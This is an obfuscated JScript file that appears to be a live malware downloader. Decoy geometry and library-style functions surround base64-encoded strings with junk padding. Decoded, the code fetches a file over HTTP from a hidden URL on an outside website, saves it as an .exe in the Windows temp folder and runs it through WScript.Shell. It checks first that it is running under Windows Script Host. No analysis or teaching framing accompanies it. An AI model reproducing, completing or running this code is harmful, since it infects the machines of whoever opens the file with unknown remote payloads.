
var wanda = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  regime = [];
	
var editorials = { ':': '.','U': 'S','381': 'X'};
	var fiction = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function marilyn(disembodied) {
	husbandry = disembodied;
	for (var i in editorials){husbandry = husbandry.replace(i, editorials[i]);}
    return husbandry;
};

var cylinder = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.marilyn4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/furthermore/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = wanda[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = wanda[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = wanda[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = wanda[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var deals ="furthermoreJVfurthermoreRFTVfurthermoreAl".marilyn4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var eddie = "furthermoreQWfurthermoreN0aXZfurthermorelWE9iafurthermoremVjdA=furthermore=".marilyn4();
String.prototype.marilyn2 = function () {
    var maintain = {
        factious: this
    };
    maintain.commissioner = maintain.factious["c3Vic3RyaW5n".marilyn4()](fiction, cylinder);
    return maintain.commissioner;
};

var wouldbe ="furthermoreRXhwYW5furthermorekRW52aXfurthermoreJvbm1lbnRTdHJfurthermorepbmdz".marilyn4();
var Native = function(options){
	
};
var symantec = [eddie, wouldbe,deals,  ""+"."+("skein","coasting","triangle","decrepit","muscles","cornell","steadfastness","descriptions","exe"), "UnVu".marilyn4(), marilyn("M"+"SX"+"ML"+("finnish","effects","brunette","swoon","tumble","ramrod","fiftythree","2.")+"381M"+"LH"+"TT"+("incapacity","arbitration","laddie","tipsy","conflagration","extirpate","vestry","advocacy","P>")+"WU"+("tamil","acknowledgement","prettier","mosaic","dusting","magenta","abating","cr")+("brittany","risky","stoic","mario","hopefully","discontinued","stitch","bhutan","ip")+"t:"+("progeny","probe","rates","tiptoe","leading","gourmet","embellish","harlot","Sh")+"ell")];
torture = "_F2_";
var forestry = this[symantec.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
CCXsvt = "nhIxzTfJNsX";
seasoning = (("references", "afterthought", "cannibalism", "refugee", "floral", "breakdown", "ambuscade", "pMqLSorQcHby") + "CjrSfoPNL").marilyn2();
ditto = (("demolition", "liabilities", "somali", "grenada", "overalls", "eagles", "specifics", "analysis", "sellers", "sEeDIWa") + "WLCXKHK").marilyn2();
  
    String.prototype.alderman = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var profiles = symantec.pop().split(">");

avenue = "b3Blbg==".marilyn4();
var precept = new forestry(profiles[1]);
var karma = new forestry(profiles[0]);
var devoted = precept[symantec.shift()](symantec.shift());
weasel = "E";

var voting = symantec.shift();
var aberdeen = symantec.shift();
function omnipresent(suckling, disposal) {

    try {
        var steam = devoted + "/" + disposal ;
		steam = steam+ voting;
            karma[avenue](("chime","concerto","enormity","reward","armament","connectors","palatine","camping","G" + weasel) + ("grass","fulfill","famous","immorality","dorchester","fella","testator","assumes","decide","saves","T"), suckling, false);
       
    karma[ditto + ("viper","posters","end")]();
	var action=("seasoning" + WScript=="seasoning" + "V2luZG93cyBTY3JpcHQgSG9zdA==".marilyn4())&&karma["c3RhdHVz".marilyn4()] +""=="MjAw".marilyn4()&&typeof(JJaDrnmHfT)==="undefined";

    if (action) {
		
        var dressed = new forestry((("breakfast","supervise","expenses","increases","motherhood","irrational","longitudinal","integrating","A")+("termination","weighted","frigid","markings","predominant","mails","interpose","receptacle","SEOO")+"DB"+("diving","nancy","americans","unconnected","jerry","rules","dreads",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        dressed[avenue]();
        ClDzBkg = "_F9_";
        dressed.type = cylinder;
        LGoEuPKKo = "_F10_";
        dressed["d3JpdGU=".marilyn4()](karma[("reich","testing","touchy","twofold","pattern","stockholm","worships","")+"R"+"es"+"pon"+editorials['U'].toLowerCase()+"e"+"Qm9keQ==".marilyn4()]);
        ERBGdvEOjuR = "_F11_";
        dressed[(seasoning + "o"+("scholars","specify","minuet","lintel","dynastic","hemlock","lawabiding","decomposition","00")+("workhouse","ursula","brigantine","outhouse","patents","hindrance","truthfulness","8i")+"tion").replace("0"+("penguin","emptiness","napkin","wooer","prank","thieving","substratum","08"), ditto)] = 0;
        wyNGxesm = "_F12_";
        dressed.saveToFile(steam, 2);
        MDaXiu = "_F13_";
        dressed.close();
        FNFCXL = "_F14_";
		precept[aberdeen](steam, cylinder, true);
    }
} catch (cNViiTLaL) { };

    tkPQMsFsbU = "_F15_";
}
try{
omnipresent("aHRfurthermore0cDfurthermoreovLw=furthermore=".marilyn4()+"\u0077\u0077\u0077"+"\u002E\u006A\u006F\u0068\u006E\u006C\u006F\u0064\u0067\u0065\u0061\u0072\u0063\u0068\u0069\u0074\u0065\u0063\u0074\u0073\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?nAHTazjvNpt=XKSAVjrnMR","EWEnRva");}catch(VPHOmon){}

   uCEWyY = "_F16_";
   